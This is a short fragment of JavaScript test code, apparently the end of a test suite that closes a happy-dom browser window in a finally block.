    } finally { await window.happyDOM.close(); }
  });
});
